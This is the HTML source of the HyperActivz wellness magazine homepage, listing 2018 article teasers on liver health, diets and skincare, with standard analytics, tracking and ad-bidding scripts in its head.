<!doctype html>
<html class="no-js" lang="en-US" prefix="og: http://ogp.me/ns#">
<head>
    <meta charset="UTF-8">
    <meta name="description" content="">
    <meta name="viewport" content="width=device-width, initial-scale=1">

    <link rel="shortcut icon" type="image/png"
          href="http://hyperactivz.com/wp-content/themes/hyperaktivz/favicon.png"/>


    <title>HyperActivz | A Magazine To Keep Calm</title>

<!-- This site is optimized with the Yoast SEO plugin v3.4.2 - https://yoast.com/wordpress/plugins/seo/ -->
<meta name="description" content="HyperActivz is your first GoTo place when it comes to wellness, healthy living, diet, weight loss and fitness. We provide you with the latest news and videos relating these topics."/>
<meta name="robots" content="noodp"/>
<link rel="canonical" href="http://hyperactivz.com/" />
<link rel="next" href="http://hyperactivz.com/page/2" />
<meta property="og:locale" content="en_US" />
<meta property="og:type" content="website" />
<meta property="og:title" content="HyperActivz | A Magazine To Keep Calm" />
<meta property="og:description" content="HyperActivz is your first GoTo place when it comes to wellness, healthy living, diet, weight loss and fitness. We provide you with the latest news and videos relating these topics." />
<meta property="og:url" content="http://hyperactivz.com/" />
<meta property="og:site_name" content="HyperActivz" />
<meta name="twitter:card" content="summary" />
<meta name="twitter:description" content="HyperActivz is your first GoTo place when it comes to wellness, healthy living, diet, weight loss and fitness. We provide you with the latest news and videos relating these topics." />
<meta name="twitter:title" content="HyperActivz | A Magazine To Keep Calm" />
<script type='application/ld+json'>{"@context":"http:\/\/schema.org","@type":"WebSite","url":"http:\/\/hyperactivz.com\/","name":"HyperActivz - A Magazine To Keep Calm","alternateName":"HyperActivz","potentialAction":{"@type":"SearchAction","target":"http:\/\/hyperactivz.com\/?s={search_term_string}","query-input":"required name=search_term_string"}}</script>
<script type='application/ld+json'>{"@context":"http:\/\/schema.org","@type":"Organization","url":"http:\/\/hyperactivz.com\/","sameAs":[],"name":"UltiSo","logo":""}</script>
<meta name="google-site-verification" content="thIHeD8B0-plAAG4Bak0ge-oybBBURUIet31xcCAAZA" />
<!-- / Yoast SEO plugin. -->

<link rel='dns-prefetch' href='//s.w.org' />
<link rel="alternate" type="application/rss+xml" title="HyperActivz &raquo; Feed" href="http://hyperactivz.com/feed" />
<link rel="alternate" type="application/rss+xml" title="HyperActivz &raquo; Comments Feed" href="http://hyperactivz.com/comments/feed" />
<link rel='stylesheet' id='hyperactivz-style-main-css'  href='http://hyperactivz.com/wp-content/themes/hyperaktivz/styles/main.css?ver=4.8.5' type='text/css' media='all' />
<script type='text/javascript' src='http://hyperactivz.com/wp-content/themes/hyperaktivz/scripts/vendor.js?ver=4.8.5'></script>
<script type='text/javascript' src='http://hyperactivz.com/wp-content/themes/hyperaktivz/scripts/vendor/modernizr.js?ver=4.8.5'></script>
<link rel='https://api.w.org/' href='http://hyperactivz.com/wp-json/' />
<link rel="EditURI" type="application/rsd+xml" title="RSD" href="http://hyperactivz.com/xmlrpc.php?rsd" />
<link rel="wlwmanifest" type="application/wlwmanifest+xml" href="http://hyperactivz.com/wp-includes/wlwmanifest.xml" /> 
<meta name="generator" content="WordPress 4.8.5" />
    <script>
      function storage(key, value) {
          var lsSupport = false;
          // Check for native support
          if (sessionStorage) {
              lsSupport = true;
          }
          // Value supplied, set new or modify store
          if (typeof value !== "undefined" && value !== null) {
              if (typeof value === 'object') {
                  value = JSON.stringify(value);
              }
              if (lsSupport) {
                  sessionStorage.setItem(key, value);
              } else {
                  createCookie(key, value, 30);
              }
          }
          // No value supplied, return value
          else if (typeof value === "undefined") {
              if (lsSupport) {
                  data = sessionStorage.getItem(key);
              } else {
                  data = readCookie(key);
              }
              return data;
          }
          // Null specified, remove store
          else if (value === null) {
              if (lsSupport) {
                  sessionStorage.removeItem(key);
              } else {
                  createCookie(key, '', -1);
              }
          }
          /**
           * Creates new cookie or removes cookie with negative expiration
           * @param  key       The key or identifier for the store
           * @param  value     Contents of the store
           * @param  exp       Expiration - creation defaults to 30 days
           */
          function createCookie(key, value, exp) {
              var date = new Date();
              date.setTime(date.getTime() + (exp * 24 * 60 * 60 * 1000));
              var expires = "; expires=" + date.toGMTString();
              document.cookie = key + "=" + value + expires + "; path=/";
          }
          /**
           * Returns contents of cookie
           * @param  key       The key or identifier for the store
           */
          function readCookie(key) {
              var nameEQ = key + "=";
              var ca = document.cookie.split(';');
              for (var i = 0, max = ca.length; i < max; i++) {
                  var c = ca[i];
                  while (c.charAt(0) === ' ') c = c.substring(1, c.length);
                  if (c.indexOf(nameEQ) === 0) return c.substring(nameEQ.length, c.length);
              }
              return null;
          }
      }

      function getParameterByName(name) {
          name = name.replace(/[\[]/, '\\[').replace(/[\]]/, '\\]');
          var regex = new RegExp('[\\?&]' + name + '=([^&#]*)'),
              results = regex.exec(location.search);
          return results === null ? '' : decodeURIComponent(results[1].replace(/\+/g, ' '));
      }

      function getUtmSource(){
          var STORAGE_SOURCE_KEY = 'cm_tracker_utm_source';
          var source = getParameterByName('utm_source');
          return source ? source : (storage(STORAGE_SOURCE_KEY) && storage(STORAGE_SOURCE_KEY) !== '' ? storage(STORAGE_SOURCE_KEY) : 'direct');
      }

      function getUtmCampaign(){
          var SOURCE_CAMPAIGN_KEY = 'cm_tracker_utm_campaign';
          var campaign = getParameterByName('utm_campaign');
          return campaign ? campaign : (storage(SOURCE_CAMPAIGN_KEY) && storage(SOURCE_CAMPAIGN_KEY) !== '' ? storage(SOURCE_CAMPAIGN_KEY) : 'direct');
      }

      function getUtmMedium(){
          var SOURCE_MEDIUM_KEY = 'cm_tracker_utm_medium';
          var medium = getParameterByName('utm_medium');
          return medium ? medium : (storage(SOURCE_MEDIUM_KEY) && storage(SOURCE_MEDIUM_KEY) !== '' ? storage(SOURCE_MEDIUM_KEY) : 'direct');
      }

      function getPageNumber(){
          var index = (document.location.pathname[document.location.pathname.length - 1] == '/')? 2 : 1;
          var number = Number(document.location.pathname.split('/')[document.location.pathname.split('/').length - index]);
          return number? number : 1;
      }
    </script>

    <!-- Google Tag Manager -->
<script>(function(w,d,s,l,i){w[l]=w[l]||[];w[l].push({'gtm.start':
new Date().getTime(),event:'gtm.js'});var f=d.getElementsByTagName(s)[0],
j=d.createElement(s),dl=l!='dataLayer'?'&l='+l:'';j.async=true;j.src=
'https://www.googletagmanager.com/gtm.js?id='+i+dl;f.parentNode.insertBefore(j,f);
})(window,document,'script','dataLayer','GTM-T3ZFMNT');</script>
<!-- End Google Tag Manager -->

<style>.async-hide { opacity: 0 !important} </style>
<script>(function(a,s,y,n,c,h,i,d,e){s.className+=' '+y;h.start=1*new Date;
h.end=i=function(){s.className=s.className.replace(RegExp(' ?'+y),'')};
(a[n]=a[n]||[]).hide=h;setTimeout(function(){i();h.end=null},c);h.timeout=c;
})(window,document.documentElement,'async-hide','dataLayer',4000,
{'GTM-KJ7SLS5':true});
</script>

<script>
  (function(i,s,o,g,r,a,m){i['GoogleAnalyticsObject']=r;i[r]=i[r]||function(){
  (i[r].q=i[r].q||[]).push(arguments)},i[r].l=1*new Date();a=s.createElement(o),
  m=s.getElementsByTagName(o)[0];a.async=1;a.src=g;m.parentNode.insertBefore(a,m)
  })(window,document,'script','https://www.google-analytics.com/analytics.js','ga');

  ga('create', 'UA-89253944-1', 'auto');
  ga('require', 'GTM-KJ7SLS5');
  ga('send', 'pageview');

</script>

<div id="fb-root"></div>
<script>(function(d, s, id) {
  var js, fjs = d.getElementsByTagName(s)[0];
  if (d.getElementById(id)) return;
  js = d.createElement(s); js.id = id;
  js.src = "//connect.facebook.net/en_US/sdk.js#xfbml=1&version=v2.8";
  fjs.parentNode.insertBefore(js, fjs);
}(document, 'script', 'facebook-jssdk'));</script>

<!-- Hotjar Tracking Code for http://www.hyperactivz.com -->
<script>
    (function(h,o,t,j,a,r){
        h.hj=h.hj||function(){(h.hj.q=h.hj.q||[]).push(arguments)};
        h._hjSettings={hjid:539999,hjsv:5};
        a=o.getElementsByTagName('head')[0];
        r=o.createElement('script');r.async=1;
        r.src=t+h._hjSettings.hjid+j+h._hjSettings.hjsv;
        a.appendChild(r);
    })(window,document,'//static.hotjar.com/c/hotjar-','.js?sv=');
</script>

<script type="text/javascript">
  var taboola_account = 'hyperactiv';
  var taboola_platform =  'desktop';
  
  var STORAGE_SOURCE_KEY = 'cm_tracker_utm_source';
  var taboola_source = getParameterByName('utm_source');
  taboola_source = taboola_source ? taboola_source : (storage(STORAGE_SOURCE_KEY) && storage(STORAGE_SOURCE_KEY) !== '' ? storage(STORAGE_SOURCE_KEY) : 'direct');
  taboola_source = taboola_source.toLowerCase();

  if (taboola_platform == 'mobile') {
    if (taboola_source == 'taboola') {
      taboola_account += 'emt';
    }
    else if (taboola_source == 'facebook') {
      taboola_account += 'emf';
    }
    else {
      taboola_account += 'emr';
    }
  }
  else if (taboola_platform == 'desktop') {
    if (taboola_source == 'taboola') {
      taboola_account += 'edt';
    }
    else {
      taboola_account += 'edr';
    }
  }
    else if (taboola_platform == 'tablet') {
      taboola_account += 'zcom';
  }
  
  window._taboola = window._taboola || [];
  _taboola.push({article:'auto'});
  !function (e, f, u, i) {
    if (!document.getElementById(i)){
      e.async = 1;
      e.src = u;
      e.id = i;
      f.parentNode.insertBefore(e, f);
    }
  }(document.createElement('script'),
  document.getElementsByTagName('script')[0],
  '//cdn.taboola.com/libtrc/' + taboola_account + '/loader.js',
  'tb_loader_script');
</script>

<!-- UNDERDOGMEDIA UTM Tracking Code Start -->
<script data-cfasync="false" language="javascript" async src="//bid.underdog.media/udm_tracker.js"></script>
<!-- UNDERDOGMEDIA UTM Tracking Code End -->

<!-- Begin comScore Tag -->
<script>
  var _comscore = _comscore || [];
  _comscore.push({ c1: "2", c2: "20535424" });
  (function() {
    var s = document.createElement("script"), el = document.getElementsByTagName("script")[0]; s.async = true;
    s.src = (document.location.protocol == "https:" ? "https://sb" : "http://b") + ".scorecardresearch.com/beacon.js";
    el.parentNode.insertBefore(s, el);
  })();
</script>
<noscript>
  <img src="http://b.scorecardresearch.com/p?c1=2&c2=20535424&cv=2.0&cj=1" />
</noscript>
<!-- End comScore Tag --><script type='text/javascript'>var PREBID_TIMEOUT = 3500; var adUnits = eval(atob("W10="));var pbjs = pbjs || {}; pbjs.que = pbjs.que || []; pbjs.bidderSettings = {aol: {bidCpmAdjustment: function(bidCpm){return bidCpm * 0.8;}},sekindo: {bidCpmAdjustment: function(bidCpm){return bidCpm * 0.7;}},districtmDMX: {bidCpmAdjustment: function(bidCpm){return bidCpm * 0.85;}},brealtime: {bidCpmAdjustment: function(bidCpm){return bidCpm * 0.85;}},springserve: {bidCpmAdjustment: function(bidCpm){return bidCpm * 0.6;}},appnexus: {bidCpmAdjustment: function(bidCpm){return bidCpm * 0.8;}},sharethrough: {bidCpmAdjustment: function(bidCpm){return bidCpm * 0.9;}}};</script>
   <script type="text/javascript" src="//d1upt0rqzff34l.cloudfront.net/HY/prebid.js" async></script>

   <script>
    var googletag = googletag || {};
    googletag.cmd = googletag.cmd || [];
    googletag.cmd.push(function() {
        googletag.pubads().disableInitialLoad();
        googletag.pubads().collapseEmptyDivs(true);
        googletag.pubads().setTargeting("pageNumber", String(getPageNumber()));
        googletag.pubads().setTargeting("utmSource", getUtmSource());
    });

    pbjs.que.push(function() {
        pbjs.setPriceGranularity({
            "buckets" : [{
                "precision": 2,
                "min" : 0,
                "max" : 3,
                "increment" : 0.01
            },
                {
                    "precision": 2,
                    "min" : 3,
                    "max" : 5,
                    "increment" : 0.05
                },
                {
                    "precision": 2,
                    "min" : 5,
                    "max" : 10,
                    "increment" : 0.1
                },
                {
                    "precision": 2,
                    "min" : 10,
                    "max" : 30,
                    "increment" : 0.5
                }]
        });
        pbjs.addAdUnits(adUnits);
        pbjs.requestBids({
            bidsBackHandler: sendAdserverRequest
        });
    });

	pbjs.que.push(function() {
	    pbjs.enableAnalytics({
	        provider: 'cmv2'
	    });
	});

    function sendAdserverRequest() {
        if (pbjs.adserverRequestSent) return;
        pbjs.adserverRequestSent = true;
        googletag.cmd.push(function() {
            pbjs.que.push(function() {
                pbjs.setTargetingForGPTAsync();
                googletag.pubads().refresh();
            });
        });
    }

    setTimeout(function() {
        sendAdserverRequest();
    }, PREBID_TIMEOUT);



  </script>

  <script>
    (function () {
        var gads = document.createElement('script');
        gads.async = true;
        gads.type = 'text/javascript';
        var useSSL = 'https:' == document.location.protocol;
        gads.src = (useSSL ? 'https:' : 'http:') +
                '//www.googletagservices.com/tag/js/gpt.js';
        var node = document.getElementsByTagName('script')[0];
        node.parentNode.insertBefore(gads, node);
    })();
  </script>

<script>
		googletag.cmd.push(function () {
		
            googletag.defineSlot('/87909099/HY-RR-MID', [[300, 600], [300, 250]], 'ad_pos_hy-rr-mid').addService(googletag.pubads());
            googletag.defineSlot('/87909099/HY-RR-ATF', [300, 250], 'ad_pos_hy-rr-atf').addService(googletag.pubads());
            googletag.defineSlot('/87909099/HY-RR-BTF', [300, 250], 'ad_pos_hy-rr-btf').addService(googletag.pubads());
            googletag.defineSlot('/87909099/HY-Desktop-Top', [728, 90], 'ad_pos_hy-desktop-top').addService(googletag.pubads());
            googletag.defineSlot('/87909099/HY-Desktop-Low', [728, 90], 'ad_pos_hy-desktop-low').addService(googletag.pubads());

            
            googletag.defineOutOfPageSlot('/87909099/HY-EDGE', 'ad_pos_hy-edge').addService(googletag.pubads());
			
        googletag.pubads().enableSingleRequest();
        googletag.enableServices();


    });
  </script>


</head>
<body class="home blog">
<!-- Google Tag Manager (noscript) -->
<noscript><iframe src="https://www.googletagmanager.com/ns.html?id=GTM-T3ZFMNT"
height="0" width="0" style="display:none;visibility:hidden"></iframe></noscript>
<!-- End Google Tag Manager (noscript) -->

<script src="http://d1rlca3pqma1yp.cloudfront.net/minder-tracker.js"></script>

<!--[if lt IE 10]>
<p class="browserupgrade">You are using an <strong>outdated</strong> browser.
    Please <a href="http://browsehappy.com/">upgrade your browser</a> to improve
    your experience.</p>
<![endif]-->
<header id="top_header">
    <div id="second_top_nav" class="hidden-xs">
	<div class="container">
		<div class="row">
			<div id="second_navbar" class="col-xs-12"><ul id="menu-top-bar" class="list-inline second_nav"><li id="menu-item-640" class="menu-item menu-item-type-post_type menu-item-object-page menu-item-640"><a title="About Us" href="http://hyperactivz.com/about-us">About Us</a></li>
<li id="menu-item-637" class="menu-item menu-item-type-post_type menu-item-object-page menu-item-637"><a title="GET EXCLUSIVE CONTENT!" href="http://hyperactivz.com/newsletter">GET EXCLUSIVE CONTENT!</a></li>
<li id="menu-item-634" class="menu-item menu-item-type-post_type menu-item-object-page menu-item-634"><a title="Contact Us" href="http://hyperactivz.com/contact-us">Contact Us</a></li>
</ul></div>		</div>
	</div>
</div>    <nav class="navbar navbar-default" id="top_nav">
	<div class="container">
		<div class="navbar-header">
			<button type="button" class="navbar-toggle collapsed" data-toggle="collapse" data-target="#navbar"
			        aria-expanded="false" aria-controls="navbar">
				<span class="sr-only">Toggle navigation</span>
				<span class="icon-bar"></span>
				<span class="icon-bar"></span>
				<span class="icon-bar"></span>
			</button>
			<a class="navbar-brand" href="http://hyperactivz.com">
									<img src="http://hyperactivz.com/wp-content/themes/hyperaktivz/images/logo.png" alt="HyperActivz" class="logo-image img-responsive">
							</a>
		</div>
		<div id="navbar" class="navbar-collapse collapse navbar-right"><ul id="menu-main-menu" class="nav navbar-nav"><li id="menu-item-621" class="menu-item menu-item-type-taxonomy menu-item-object-category menu-item-621"><a title="Entertainment" href="http://hyperactivz.com/category/entertainment">Entertainment</a></li>
<li id="menu-item-625" class="menu-item menu-item-type-taxonomy menu-item-object-category menu-item-625"><a title="Fitness" href="http://hyperactivz.com/category/wellness/fitness">Fitness</a></li>
<li id="menu-item-627" class="menu-item menu-item-type-taxonomy menu-item-object-category menu-item-627"><a title="Diet And Weight Loss" href="http://hyperactivz.com/category/wellness/diet-weight-loss">Diet And Weight Loss</a></li>
<li id="menu-item-628" class="menu-item menu-item-type-taxonomy menu-item-object-category menu-item-628"><a title="Anti Aging" href="http://hyperactivz.com/category/wellness/anti-aging">Anti Aging</a></li>
<li id="menu-item-629" class="menu-item menu-item-type-taxonomy menu-item-object-category menu-item-629"><a title="Sleep" href="http://hyperactivz.com/category/wellness/sleep">Sleep</a></li>
<li id="menu-item-3226" class="menu-item menu-item-type-taxonomy menu-item-object-category menu-item-3226"><a title="DIY" href="http://hyperactivz.com/category/diy">DIY</a></li>
</ul></div>		<!--/.navbar-collapse -->
	</div>
</nav></header>
<main id="main_content">

    <div id="banner">
    <div class="container">
        <div class="row">
            <div class="col-xs-12">
                <div class="banner_top_wrap">

                
<div class="top_block_big">
                                <article>
        <a href="http://hyperactivz.com/honey-pear-tea" class="wrapp_item">
            <div class="wrap_img_article">
                <div class="img_article" style="background-image: url('http://d1nnx3nhddxmeh.cloudfront.net/wp-content/uploads/2018/02/12153030/green-pear-tea-l.jpg')"></div>
            </div>
            <div class="item_text">
                <h2 class="header_item">Honey Pear Tea</h2>
                <p class="meta_post"><span class="meta_post_author">Amanda Garris</span> &bull; <span class="meta_post_date">Mar 17, 2018</span></p>
                <p class="meta_categoty">Diet And Weight Loss</p>
            </div>
        </a>
    </article>
    </div>


                <div class="top_block_right clearfix">
                <article>
        <a href="http://hyperactivz.com/8-health-benefits-eggs-diet" class="wrapp_item">
            <div class="wrap_img_article">
                <div class="img_article" style="background-image: url('http://d1nnx3nhddxmeh.cloudfront.net/wp-content/uploads/2018/02/12152640/sunnyside-up-eggs.png')"></div>
            </div>
            <div class="item_text">
                <h2 class="header_item">8 Health Benefits of Eggs in Your Diet</h2>
                <p class="meta_post"><span class="meta_post_author">Amanda Garris</span> &bull; <span class="meta_post_date">Mar 15, 2018</span></p>
                <p class="meta_categoty">Diet And Weight Loss</p>
            </div>
        </a>
    </article>
                    <article>
        <a href="http://hyperactivz.com/essential-skincare-guide" class="wrapp_item">
            <div class="wrap_img_article">
                <div class="img_article" style="background-image: url('http://d1nnx3nhddxmeh.cloudfront.net/wp-content/uploads/2018/02/12152312/scrub-25-1477394193.jpg')"></div>
            </div>
            <div class="item_text">
                <h2 class="header_item">Your essential skincare guide</h2>
                <p class="meta_post"><span class="meta_post_author">Julie Heinz</span> &bull; <span class="meta_post_date">Mar 13, 2018</span></p>
                <p class="meta_categoty">Anti Aging</p>
            </div>
        </a>
    </article>
    </div>
                </div>
            </div>
        </div>
    </div>
</div>
    <div id="three_blocks">
    <div class="container">
        <div class="row">
            <div class="col-xs-12 col-sm-3">

                
<h2 class="title_block">Editor's Choice</h2>
<div class="three_blocks_item three_blocks_item_right">
							            <div class="tbcb_item">
                <a href="http://hyperactivz.com/liver-disorders-causes">
                    <div class="tb_img_wrap">
                        <div class="tb_img" style="background-image: url('http://d1nnx3nhddxmeh.cloudfront.net/wp-content/uploads/2018/02/12151727/webmd_rf_photo_of_liver_and_hepatitis_virus.jpg')"></div>
                    </div>
                    <p class="tbcb_item_meta">
                        <span class="tbcb_item_category">Wellness</span>
                    </p>
                    <h2 class="tbcb_item_head">Liver Disorders and Their Causes</h2>
                    <p class="meta_post"><span class="meta_post_author">Joe Nesmith</span> &bull; <span class="meta_post_date">Mar 11, 2018</span></p>
                </a>
            </div>

									            <div class="tbcb_item">
                <a href="http://hyperactivz.com/10-best-tips-wrinkle-free-skin">
                    <div class="tb_img_wrap">
                        <div class="tb_img" style="background-image: url('http://d1nnx3nhddxmeh.cloudfront.net/wp-content/uploads/2018/02/12145659/ageing.jpg')"></div>
                    </div>
                    <p class="tbcb_item_meta">
                        <span class="tbcb_item_category">Anti Aging</span>
                    </p>
                    <h2 class="tbcb_item_head">10 Best Tips for a Wrinkle-Free Skin</h2>
                    <p class="meta_post"><span class="meta_post_author">Lee Jordan</span> &bull; <span class="meta_post_date">Mar 9, 2018</span></p>
                </a>
            </div>

			
    <hr class="tbcb_border visible-xs-block">

</div>
            </div>
            <div class="col-xs-12 col-sm-6 hidden-xs">

                
<h2 class="title_block">New Stories</h2>
<div class="three_blocks_item three_blocks_item_center clearfix">
                <div class="tbcb_item">
        <a href="http://hyperactivz.com/routines-healthy-skin">
            <div class="tb_img_wrap">
                <div class="tb_img" style="background-image: url('http://d1nnx3nhddxmeh.cloudfront.net/wp-content/uploads/2018/02/12145413/images-8.jpeg')"></div>
            </div>
            <p class="tbcb_item_meta">
                <span class="tbcb_item_category">Beauty</span>
            </p>
            <p class="meta_post"><span class="meta_post_author">Amanda Garris</span> &bull; <span class="meta_post_date">Mar 7, 2018</span></p>
            <h2 class="tbcb_item_head">Routines for a Healthy Skin </h2>

        </a>
    </div>
                <div class="tbcb_item">
        <a href="http://hyperactivz.com/going-vegan-good-bad">
            <div class="tb_img_wrap">
                <div class="tb_img" style="background-image: url('http://d1nnx3nhddxmeh.cloudfront.net/wp-content/uploads/2018/02/12145115/Vegetarian-Diet.jpg')"></div>
            </div>
            <p class="tbcb_item_meta">
                <span class="tbcb_item_category">Diet And Weight Loss</span>
            </p>
            <p class="meta_post"><span class="meta_post_author">Francine Pines</span> &bull; <span class="meta_post_date">Mar 5, 2018</span></p>
            <h2 class="tbcb_item_head">Going Vegan- Good or Bad?</h2>

        </a>
    </div>
                <div class="tbcb_item">
        <a href="http://hyperactivz.com/8-best-diets-healthy">
            <div class="tb_img_wrap">
                <div class="tb_img" style="background-image: url('http://d1nnx3nhddxmeh.cloudfront.net/wp-content/uploads/2018/02/12144538/spinach-in-a-bowl-e1518439548719.jpg')"></div>
            </div>
            <p class="tbcb_item_meta">
                <span class="tbcb_item_category">Diet And Weight Loss</span>
            </p>
            <p class="meta_post"><span class="meta_post_author">Lee Jordan</span> &bull; <span class="meta_post_date">Mar 3, 2018</span></p>
            <h2 class="tbcb_item_head">8 best diets for a healthy you</h2>

        </a>
    </div>
    
    <div class="tbcb_item_single_center_post">

    
    <a href="http://hyperactivz.com/tackle-aging-skin">
        <div class="row">
            <div class="col-md-4">
                <div class="wrap_meta_text">
                    <p class="tbcb_item_meta">
                        <span class="tbcb_item_category">Animals</span>
                    </p>
                    <h2 class="tbcb_item_head">How to tackle aging of skin</h2>
                    <p class="meta_post"><span class="meta_post_author">Amanda Garris</span> &bull; <span class="meta_post_date">Mar 1, 2018</span></p>
                    <p class="tbcb_item_excerpt">
                        


When the skin ages prematurely it is indeed a cause for worry especially for the women. However, there is good news for such people. This...                    </p>
                </div>

            </div>
            <div class="col-md-8">
                <div class="tb_img_wrap_single_center">
                    <div class="tb_img" style="background-image: url('http://d1nnx3nhddxmeh.cloudfront.net/wp-content/uploads/2018/02/12120252/aloe-vera-625_625x350_71443086188.jpg')"></div>
                </div>
            </div>
        </div>
    </a>

    
</div>

</div><!--three_blocks_item_post-->
            </div>
            <div class="col-xs-12 col-sm-3 hidden-xs">

                
<h2 class="title_block">Trending Now</h2>
<div class="three_blocks_item three_blocks_item_right hiden-xs">
                <div class="tbcb_item">
        <a href="http://hyperactivz.com/keep-skin-glowing">
            <div class="tb_img_wrap">
                <div class="tb_img" style="background-image: url('http://d1nnx3nhddxmeh.cloudfront.net/wp-content/uploads/2018/02/12115614/c700x420-1.jpg')"></div>
            </div>
            <p class="tbcb_item_meta">
                <span class="tbcb_item_category">Anti Aging</span>
            </p>
            <h2 class="tbcb_item_head">How to Keep your Skin Glowing</h2>
            <p class="meta_post"><span class="meta_post_author">Benny Norman</span> &bull; <span class="meta_post_date">Feb 27, 2018</span></p>
        </a>
    </div>

                <div class="tbcb_item">
        <a href="http://hyperactivz.com/top-foods-fit-liver">
            <div class="tb_img_wrap">
                <div class="tb_img" style="background-image: url('http://d1nnx3nhddxmeh.cloudfront.net/wp-content/uploads/2018/02/12115142/How-to-Preserve-Food-by-Pickling.jpg')"></div>
            </div>
            <p class="tbcb_item_meta">
                <span class="tbcb_item_category">Food</span>
            </p>
            <h2 class="tbcb_item_head">Top Foods for a Fit Liver</h2>
            <p class="meta_post"><span class="meta_post_author">Francine Pines</span> &bull; <span class="meta_post_date">Feb 25, 2018</span></p>
        </a>
    </div>

    
    <hr class="tbcb_border visible-xs-block">

</div><!--three_blocks_item_center-->
            </div>
        </div>
    </div>
</div>
    <div id="banner_widget" class="hidden-xs hidden-sm">
    <div class="container">
        <div class="row">
            <div class="col-xs-8">
                <div class="wrap_ads_center">

                                            <div id="text-3" class="widget_text banner-widget-center"><div class="ads">			<div class="textwidget">
<div style="text-align:center;">
<script async src="//pagead2.googlesyndication.com/pagead/js/adsbygoogle.js"></script>
<!-- HY D Floor WW (Dynamic) -->
<ins class="adsbygoogle"
     style="display:inline-block;width:728px;height:90px"
     data-ad-client="ca-pub-9146243825510118"
     data-ad-slot="6643570384"></ins>
<script>
(adsbygoogle = window.adsbygoogle || []).push({});
</script>
</div>
</div>
		</div></div>
                    
                </div>
            </div>
            <div class="col-xs-4">
                <div class="social_links_block">
                    <a href="https://www.facebook.com/HyperActivz-750007205152027/" target="_blank"><img src="http://hyperactivz.com/wp-content/themes/hyperaktivz/images/img/facebook.png" class="img-responsive" alt=""></a>
                    <a href="https://twitter.com/hyperactivz" target="_blank"><img src="http://hyperactivz.com/wp-content/themes/hyperaktivz/images/img/twwe.png" class="img-responsive" alt=""></a>
<!--                    <a href="http://youtube.com"> <img src="--><!--/images/img/youtube.png" class="img-responsive" alt=""></a>-->
                </div>
            </div>
        </div>
    </div>
</div>
    <div class="container">
    <div class="row">
        <div class="col-xs-12">
            <div class="wrap_main_post_block">

                
<div class="main_content ">
    <h2 class="title_block"></h2>
                <article>
        <a href="http://hyperactivz.com/foods-bad-liver" class="wrapp_item clearfix">


                    <div class="wrap_img_article">
                        <div class="img_article" style="background-image: url('http://d1nnx3nhddxmeh.cloudfront.net/wp-content/uploads/2018/02/12114051/61suSqz2x1L._US500_.jpg')"></div>
                    </div>


                    <div class="item_text">
                        <h2 class="header_item">Foods that are bad for your liver</h2>
                        <p class="meta_post"><span class="meta_post_author">Matthew Jacobson</span> &bull; <span class="meta_post_date">Feb 23, 2018</span></p>

                        <p class="excerpt_item">


There are certain foods that aid the liver health, while there are a few others that can cause damage to the liver. Since liver is an important...</p>

                        <p class="read_more_post">Read more</p>
                    </div>


        </a>
        <div class="category_divider hidden-sm hidden-xs hidden-md" ></div>
    </article>

                <article>
        <a href="http://hyperactivz.com/what-your-liver-does" class="wrapp_item clearfix">


                    <div class="wrap_img_article">
                        <div class="img_article" style="background-image: url('http://d1nnx3nhddxmeh.cloudfront.net/wp-content/uploads/2018/02/12104639/Liverhires-e1518425211161.jpg')"></div>
                    </div>


                    <div class="item_text">
                        <h2 class="header_item">What Your Liver Does</h2>
                        <p class="meta_post"><span class="meta_post_author">Benny Norman</span> &bull; <span class="meta_post_date">Feb 21, 2018</span></p>

                        <p class="excerpt_item">



Liver is an important organ in the human body and it has a main role in the metabolism of the body. Being one of the biggest organs of the...</p>

                        <p class="read_more_post">Read more</p>
                    </div>


        </a>
        <div class="category_divider hidden-sm hidden-xs hidden-md" ></div>
    </article>

                <article>
        <a href="http://hyperactivz.com/vegan-diets-can-help" class="wrapp_item clearfix">


                    <div class="wrap_img_article">
                        <div class="img_article" style="background-image: url('http://d1nnx3nhddxmeh.cloudfront.net/wp-content/uploads/2018/02/12104113/maxresdefault-9.jpg')"></div>
                    </div>


                    <div class="item_text">
                        <h2 class="header_item">How Vegan Diets Can Help You? </h2>
                        <p class="meta_post"><span class="meta_post_author">Julie Heinz</span> &bull; <span class="meta_post_date">Feb 19, 2018</span></p>

                        <p class="excerpt_item">


A vegan diet is one which only includes plant based foods, mostly vegetable, fruits, nuts and grains. Any animal based food like meat, dairy...</p>

                        <p class="read_more_post">Read more</p>
                    </div>


        </a>
        <div class="category_divider hidden-sm hidden-xs hidden-md" ></div>
    </article>

                <article>
        <a href="http://hyperactivz.com/5-best-types-diets" class="wrapp_item clearfix">


                    <div class="wrap_img_article">
                        <div class="img_article" style="background-image: url('http://d1nnx3nhddxmeh.cloudfront.net/wp-content/uploads/2018/02/12103838/vegan-diet-.jpg')"></div>
                    </div>


                    <div class="item_text">
                        <h2 class="header_item">5 Best Types of Diets</h2>
                        <p class="meta_post"><span class="meta_post_author">Francine Pines</span> &bull; <span class="meta_post_date">Feb 17, 2018</span></p>

                        <p class="excerpt_item">


A diet is defined as a way of eating to suit our body type and to keep it healthy, avoid diseases and live a good life. So, there could be...</p>

                        <p class="read_more_post">Read more</p>
                    </div>


        </a>
        <div class="category_divider hidden-sm hidden-xs hidden-md" ></div>
    </article>

                <article>
        <a href="http://hyperactivz.com/6-tips-healthy-liver" class="wrapp_item clearfix">


                    <div class="wrap_img_article">
                        <div class="img_article" style="background-image: url('http://d1nnx3nhddxmeh.cloudfront.net/wp-content/uploads/2018/02/12103056/detoxifying-foods.jpg')"></div>
                    </div>


                    <div class="item_text">
                        <h2 class="header_item">6 Tips For A Healthy Liver</h2>
                        <p class="meta_post"><span class="meta_post_author">Matthew Jacobson</span> &bull; <span class="meta_post_date">Feb 15, 2018</span></p>

                        <p class="excerpt_item">


The human body is a machine which works on the support of many organs, and the liver is the organ that is acknowledged for its ability to...</p>

                        <p class="read_more_post">Read more</p>
                    </div>


        </a>
        <div class="category_divider hidden-sm hidden-xs hidden-md" ></div>
    </article>

                <article>
        <a href="http://hyperactivz.com/tips-increase-chest-muscles" class="wrapp_item clearfix">


                    <div class="wrap_img_article">
                        <div class="img_article" style="background-image: url('http://d1nnx3nhddxmeh.cloudfront.net/wp-content/uploads/2018/01/11112455/pecs_3.jpg')"></div>
                    </div>


                    <div class="item_text">
                        <h2 class="header_item">Tips to Increase Your Chest Muscles</h2>
                        <p class="meta_post"><span class="meta_post_author">Amanda Garris</span> &bull; <span class="meta_post_date">Feb 13, 2018</span></p>

                        <p class="excerpt_item">


It’s the start of another year. Whether you like it or not, the holidays are over. The good news is, this signals that summer is coming soon –...</p>

                        <p class="read_more_post">Read more</p>
                    </div>


        </a>
